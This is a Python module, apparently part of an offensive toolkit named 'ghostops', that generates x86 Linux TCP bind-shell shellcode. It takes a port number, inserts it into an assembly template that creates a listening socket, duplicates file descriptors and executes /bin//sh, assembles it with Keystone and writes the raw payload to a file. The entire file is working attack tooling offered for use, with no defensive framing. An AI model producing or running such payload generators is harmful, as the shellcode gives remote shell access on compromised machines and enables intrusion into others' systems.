from pathlib import Path
from keystone import KsError, Ks, KS_ARCH_X86, KS_MODE_32
from ghostops.common.utils import Logger, HexConvert
from ghostops.core.base_module import BaseModule


class LinuxX86ShellBindTcp(BaseModule):
    name = "LinuxX86ShellBindTcp"
    description = "Generates TCP bind shell payload for x86 Linux system."
    author = "Awagat Dhungana <4w4647@gmail.com>"
    category = "payload"
    os = ["linux"]
    arch = ["x86"]

    @staticmethod
    def register_arguments(parser):
        parser.add_argument("--port", required=True, type=int, help="port number")
        parser.add_argument(
            "--output",
            required=True,
            type=str,
            help="Output filename for raw shellcode (e.g., ghostops.bin)",
        )

    @staticmethod
    def run(args):
        Logger.log("info", f"PORT - {args.port}")
        print()

        try:
            port_hex = HexConvert.port_to_hex(args.port)
        except Exception:
            Logger.log("flaw", "Invalid host or port provided.")
            return

        shellcode_template = f"""
xor    ebx,ebx
mul    ebx
push   ebx
inc    ebx
push   ebx
push   0x2
mov    ecx,esp
mov    al,0x66
int    0x80
pop    ebx
pop    esi
push   edx
push   0x{port_hex}0002
push   0x10
push   ecx
push   eax
mov    ecx,esp
push   0x66
pop    eax
int    0x80
mov    DWORD PTR [ecx+0x4],eax
mov    bl,0x4
mov    al,0x66
int    0x80
inc    ebx
mov    al,0x66
int    0x80
xchg   ebx,eax
pop    ecx
push   0x3f
pop    eax
int    0x80
dec    ecx
jns    0x32
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
push   eax
push   ebx
mov    ecx,esp
mov    al,0xb
int    0x80 
        """

        try:
            ks = Ks(KS_ARCH_X86, KS_MODE_32)
            encoding, _ = ks.asm(shellcode_template)
        except KsError as e:
            Logger.log("flaw", f"Assembly failed: {e}")
            return

        shellcode_bytes = bytes(encoding)
        Logger.log("good", f"Shellcode size: {len(shellcode_bytes)} bytes")

        output_path = Path(args.output)
        try:
            with open(output_path, "wb") as f:
                f.write(shellcode_bytes)
            Logger.log("good", f"Raw shellcode written to {output_path}")
        except Exception as e:
            Logger.log("flaw", f"Failed to write shellcode to file: {e}")
